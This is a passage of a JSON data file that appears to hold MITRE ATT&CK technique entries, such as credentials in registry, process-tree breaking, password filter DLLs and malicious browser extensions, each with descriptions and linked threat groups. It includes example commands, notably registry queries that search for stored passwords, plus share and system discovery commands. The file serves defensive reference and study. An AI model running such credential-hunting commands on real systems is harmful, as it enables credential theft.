365"],"tactics":["Collection"],"campaigns":["C0027"],"groups":["Fox Kitten"]},"T1565.003":{"id":"T1565.003","name":"Runtime Data Manipulation","description":"Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.^[[1]](https://content.fireeye.com/apt/rpt-apt38)^^[[2]](https://www.justice.gov/opa/press-release/file/1092091/download)^ By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.","platforms":["Linux","macOS","Windows"],"tactics":["Impact"],"campaigns":[],"groups":["APT38"]},"T1552.002":{"id":"T1552.002","name":"Credentials in Registry","description":"Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information: ^[[1]](https://pentestlab.blog/2017/04/19/stored-credentials/)^\n\n* Local Machine Hive: `reg query HKLM /f password /t REG_SZ /s`\n* Current User Hive: `reg query HKCU /f password /t REG_SZ /s`","platforms":["Windows"],"tactics":["Credential Access"],"campaigns":[],"groups":["APT32"]},"T1135":{"id":"T1135","name":"Network Share Discovery","description":"Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol. ^[[1]](https://en.wikipedia.org/wiki/Shared_resource)^ ^[[2]](https://technet.microsoft.com/library/cc770880.aspx)^ [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the `net view \\\\\\\\remotesystem` command. It can also be used to query shared drives on the local system using `net share`. For macOS, the `sharing -l` command lists all shared points used for smb services.","platforms":["macOS","Windows","Linux"],"tactics":["Discovery"],"campaigns":["C0015","Operation Wocao","Operation CuckooBees"],"groups":["Tonto Team","APT39","DarkVishnya","APT32","APT41","Chimera","APT38","FIN13","Tropic Trooper","Sowbug","Dragonfly","APT1","Wizard Spider","Operation Wocao","Dragonfly 2.0"]},"T1120":{"id":"T1120","name":"Peripheral Device Discovery","description":"Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.^[[1]](https://linuxhint.com/list-usb-devices-linux/)^^[[2]](https://ss64.com/osx/system_profiler.html)^ Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.","platforms":["Windows","macOS","Linux"],"tactics":["Discovery"],"campaigns":["Operation CuckooBees","Operation Wocao"],"groups":["Equation","APT37","APT28","Turla","OilRig","TeamTNT","Gamaredon Group","BackdoorDiplomacy","Operation Wocao"]},"T1036.009":{"id":"T1036.009","name":"Break Process Trees","description":"An adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the “parent-child\" relationship for detection, breaking this relationship could result in the adversary’s behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs.^[[1]](https://0xjet.github.io/3OHA/2022/04/11/post.html)^ \n\nOn Linux systems, adversaries may execute a series of [Native API](https://attack.mitre.org/techniques/T1106) calls to alter malware's process tree. For example, adversaries can execute their payload without any arguments, call the `fork()` API call twice, then have the parent process exit. This creates a grandchild process with no parent process that is immediately adopted by the `init` system process (PID 1), which successfully disconnects the execution of the adversary's payload from its previous process tree.\n\nAnother example is using the “daemon” syscall to detach from the current parent process and run in the background.^[[2]](https://sandflysecurity.com/blog/bpfdoor-an-evasive-linux-backdoor-technical-analysis/)^^[[3]](https://www.microsoft.com/en-us/security/blog/2022/05/19/rise-in-xorddos-a-deeper-look-at-the-stealthy-ddos-malware-targeting-linux-devices/)^ ","platforms":["Linux","macOS"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1590.004":{"id":"T1590.004","name":"Network Topology","description":"Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).^[[1]](https://dnsdumpster.com/)^ Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["FIN13"]},"T1587.002":{"id":"T1587.002","name":"Code Signing Certificates","description":"Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.^[[1]](https://en.wikipedia.org/wiki/Code_signing)^ Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may develop self-signed code signing certificates for use in operations.","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":["Operation Dream Job"],"groups":["PROMETHIUM","Patchwork"]},"T1222.001":{"id":"T1222.001","name":"Windows File and Directory Permissions Modification","description":"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.^[[1]](https://www.hybrid-analysis.com/sample/ef0d2628823e8e0a0de3b08b8eacaf41cf284c086a948bdfd67f4e4373c14e4d?environmentId=100)^^[[2]](https://www.hybrid-analysis.com/sample/22dab012c3e20e3d9291bce14a2bfc448036d3b966c6e78167f4626f5f9e38d6?environmentId=110)^ File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).^[[3]](https://docs.microsoft.com/windows/desktop/secauthz/dacls-and-aces)^ Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.^[[4]](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-lists)^\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["Wizard Spider"]},"T1137.006":{"id":"T1137.006","name":"Add-ins","description":"Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. ^[[1]](https://support.office.com/article/Add-or-remove-add-ins-0af570c4-5cf3-4fa9-9b88-403625a0b460)^ There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. ^[[2]](https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/)^^[[3]](https://summit.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s03-youve-got-mail.pdf)^\n\nAdd-ins can be used to obtain persistence because they can be set to execute code when an Office application starts. ","platforms":["Windows","Office 365"],"tactics":["Persistence"],"campaigns":[],"groups":["Naikon"]},"T1505.002":{"id":"T1505.002","name":"Transport Agent","description":"Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.^[[1]](https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help)^^[[2]](https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf)^ Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. \n\nAdversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.^[[2]](https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf)^ Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary. ","platforms":["Linux","Windows"],"tactics":["Persistence"],"campaigns":[],"groups":[]},"T1082":{"id":"T1082","name":"System Information Discovery","description":"An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the `systemsetup` configuration tool on macOS. As an example, adversaries with user-level access can execute the `df -aH` command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. `show version`).^[[1]](https://www.us-cert.gov/ncas/alerts/TA18-106A)^ [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.^[[2]](https://www.sentinelone.com/blog/trail-osx-fairytale-adware-playing-malware/)^^[[3]](https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/)^\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.^[[4]](https://docs.aws.amazon.com/cli/latest/reference/ssm/describe-instance-information.html)^^[[5]](https://cloud.google.com/compute/docs/reference/rest/v1/instances)^^[[6]](https://docs.microsoft.com/en-us/rest/api/compute/virtualmachines/get)^","platforms":["Windows","IaaS","Linux","macOS","Network"],"tactics":["Discovery"],"campaigns":["C0017","Frankenstein","Operation CuckooBees","Operation Honeybee","SolarWinds Compromise","Operation Wocao","FunnyDream"],"groups":["Windigo","OilRig","ZIRCONIUM","Blue Mockingbird","HEXANE","Darkhotel","TA2541","FIN13","Rocke","Gamaredon Group","APT37","APT32","Inception","Lazarus Group","Volt Typhoon","Moses Staff","Higaisa","Confucius","APT38","Mustang Panda","Kimsuky","MuddyWater","TeamTNT","APT3","Sidewinder","Magic Hound","SideCopy","Chimera","APT19","APT18","FIN8","Tropic Trooper","Aquatic Panda","Sowbug","Wizard Spider","Turla","Patchwork","Windshift","admin@338","Stealth Falcon","Sandworm Team","Ke3chang","APT29","UNC2452","Honeybee","Operation Wocao","Frankenstein","APT28"]},"T1071":{"id":"T1071","name":"Application Layer Protocol","description":"Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":[],"groups":["Magic Hound","Rocke","TeamTNT","Dragonfly 2.0","APT34"]},"T1074.002":{"id":"T1074.002","name":"Remote Data Staging","description":"Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.^[[1]](https://content.fireeye.com/m-trends/rpt-m-trends-2020)^\n\nBy staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.","platforms":["Windows","IaaS","Linux","macOS"],"tactics":["Collection"],"campaigns":["SolarWinds Compromise","Night Dragon"],"groups":["Chimera","menuPass","FIN8","Leviathan","APT28","MoustachedBouncer","FIN6","Threat Group-3390","UNC2452","APT29","Night Dragon"]},"T1098.006":{"id":"T1098.006","name":"Additional Container Cluster Roles","description":"An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.^[[1]](https://kubernetes.io/docs/concepts/security/rbac-good-practices/)^^[[2]](https://blog.aquasec.com/leveraging-kubernetes-rbac-to-backdoor-clusters)^ Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.^[[3]](https://kubernetes.io/docs/reference/access-authn-authz/abac/)^\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.^[[4]](https://cloud.google.com/kubernetes-engine/docs/how-to/iam)^^[[5]](https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html)^^[[6]](https://learn.microsoft.com/en-us/azure/aks/concepts-identity)^ In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).","platforms":["Containers"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":[]},"T1053":{"id":"T1053","name":"Scheduled Task/Job","description":"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.^[[1]](https://technet.microsoft.com/en-us/library/cc785125.aspx)^\n\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.^[[2]](https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain)^","platforms":["Windows","Linux","macOS","Containers"],"tactics":["Execution","Persistence","Privilege Escalation"],"campaigns":[],"groups":["Earth Lusca","Dragonfly"]},"T1218.007":{"id":"T1218.007","name":"Msiexec","description":"Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).^[[1]](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec)^ The Msiexec.exe binary may also be digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.^[[2]](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/)^^[[3]](https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/)^ Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the `AlwaysInstallElevated` policy is enabled.^[[4]](https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["Molerats","TA505","Rancor","ZIRCONIUM","Machete"]},"T1590.003":{"id":"T1590.003","name":"Network Trust Dependencies","description":"Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).^[[1]](https://www.slideshare.net/rootedcon/carlos-garca-pentesting-active-directory-forests-rooted2019)^ Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":[]},"T1498.002":{"id":"T1498.002","name":"Reflection Amplification","description":"Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target.^[[1]](https://blog.cloudflare.com/reflections-on-reflections/)^ This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.\n\nReflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS^[[2]](https://www.cloudflare.com/learning/ddos/dns-amplification-ddos-attack/)^ and NTP^[[3]](https://www.cloudflare.com/learning/ddos/ntp-amplification-ddos-attack/)^, though the use of several others in the wild have been documented.^[[4]](https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf)^  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.^[[5]](https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/)^","platforms":["Windows","Azure AD","Office 365","SaaS","IaaS","Linux","macOS","Google Workspace"],"tactics":["Impact"],"campaigns":[],"groups":[]},"T1556.002":{"id":"T1556.002","name":"Password Filter DLL","description":"Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.^[[1]](http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html)^","platforms":["Windows"],"tactics":["Credential Access","Defense Evasion","Persistence"],"campaigns":[],"groups":["Strider"]},"T1505.005":{"id":"T1505.005","name":"Terminal Services DLL","description":"Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.^[[1]](https://docs.microsoft.com/windows/win32/termserv/about-terminal-services)^\n\n[Windows Service](https://attack.mitre.org/techniques/T1543/003)s that are run as a \"generic\" process (ex: `svchost.exe`) load the service's DLL file, the location of which is stored in a Registry entry named `ServiceDll`.^[[2]](https://social.technet.microsoft.com/wiki/contents/articles/12229.windows-system-services-fundamentals.aspx)^ The `termsrv.dll` file, typically stored in `%SystemRoot%\\System32\\`, is the default `ServiceDll` value for Terminal Services in `HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\`.\n\nAdversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.^[[3]](https://twitter.com/james_inthe_box/status/1150495335812177920)^ Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal `termsrv.dll` functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) sessions by either patching the `termsrv.dll` file or modifying the `ServiceDll` value to point to a DLL that provides increased RDP functionality.^[[4]](http://woshub.com/how-to-allow-multiple-rdp-sessions-in-windows-10/)^^[[5]](https://github.com/stascorp/rdpwrap)^ On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.","platforms":["Windows"],"tactics":["Persistence"],"campaigns":[],"groups":[]},"T1059.002":{"id":"T1059.002","name":"AppleScript","description":"Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.^[[1]](https://developer.apple.com/library/archive/documentation/AppleScript/Conceptual/AppleScriptLangGuide/introduction/ASLR_intro.html)^ These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.\n\nScripts can be run from the command-line via `osascript /path/to/script` or `osascript -e \"script here\"`. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding `#!/usr/bin/osascript` to the start of the script file.^[[2]](https://www.sentinelone.com/blog/how-offensive-actors-use-applescript-for-attacking-macos/)^\n\nAppleScripts do not need to call `osascript` to execute. However, they may be executed from within mach-O binaries by using the macOS [Native API](https://attack.mitre.org/techniques/T1106)s `NSAppleScript` or `OSAScript`, both of which execute code independent of the `/usr/bin/osascript` command line utility.\n\nAdversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.^[[3]](https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/)^ Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006).^[[4]](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/macro-malware-targets-macs/)^","platforms":["macOS"],"tactics":["Execution"],"campaigns":[],"groups":[]},"T1176":{"id":"T1176","name":"Browser Extensions","description":"Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.^[[1]](https://en.wikipedia.org/wiki/Browser_extension)^^[[2]](https://developer.chrome.com/extensions)^\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.^[[3]](https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/43824.pdf)^ Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the `profiles` tool to install malicious `.mobileconfig` files. In macOS 11+, the use of the `profiles` tool can no longer install configuration profiles, however `.mobileconfig` files can be planted and installed with user interaction.^[[4]](https://www.xorrior.com/No-Place-Like-Chrome/)^\n\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.^[[5]](https://www.ghacks.net/2017/09/19/first-chrome-extension-with-javascript-crypto-miner-detected/)^^[[6]](https://www.icebrg.io/blog/malicious-chrome-extensions-enable-criminals-to-impact-over-half-a-million-users-and-global-businesses)^^[[7]](https://isc.sans.edu/forums/diary/BankerGoogleChromeExtensiontargetingBrazil/22722/)^^[[8]](https://isc.sans.edu/forums/diary/CatchAll+Google+Chrome+Malicious+Extension+Steals+All+Posted+Data/22976/https:/threatpost.com/malicious-chrome-extension-steals-data-posted-to-any-website/128680/))^\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions.^[[9]](https://www.welivesecurity.com/2017/07/20/stantinko-massive-adware-campaign-operating-covertly-since-2012/)^ There have also been similar examples of extensions being used for command & control.^[[10]](https://kjaer.io/extension-malware/)^","platforms":["Linux","macOS","Windows"],"tactics":["Persistence"],"campaigns":[],"groups":["Kimsuky","Stolen Pencil"]},"T1499.002":{"id":"T1499.002","name":"Service Exhaustion Flood","description":"Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well.^[[1]](https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf)^ Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.\n\nOne example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.^[[2]](https://www.cloudflare.com/learning/ddos/http-flood-ddos-attack/)^\n\nAnother variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.^[[3]](https://www.netscout.com/blog/asert/ddos-attacks-ssl-something-old-something-new)^","platforms":["Windows","Azure AD","Office 365","SaaS","IaaS","Linux","macOS","Google Workspace"],"tactics":["Impact"],"campaigns":[],"groups":[]},"T1195.003":{"id":"T1195.003","name":"Compromise Hardware Supply Chain","description":"Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.","platforms":["Linux","macOS","Windows"],"tactics":["Initial Access"],"campaigns":[],"groups":[]},"T1106":{"id":"T1106","name":"Native API","description":"Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.^[[1]](https://undocumented.ntinternals.net/)^^[[2]](https://www.kernel.org/doc/html/v4.12/core-api/kernel-api.html)^ These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as `NtCreateProcess`) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.^[[3]](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)^^[[4]](https://www.cyberbit.com/blog/endpoint-security/malware-mitigation-when-direct-system-calls-are-used/)^^[[5]](https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/)^ For example, functions such as the Windows API `CreateProcess()` or GNU `fork()` will allow programs and scripts to start other processes.^[[6]](http://msdn.microsoft.com/en-us/library/ms682425)^^[[7]](https://www.gnu.org/software/libc/manual/html_node/Creating-a-Process.html)^ This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.^[[8]](https://docs.microsoft.com/en-us/windows/win32/api/)^^[[9]](https://man7.org/linux/man-pages//man7/libc.7.html)^^[[10]](https://www.gnu.org/software/libc/)^\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks 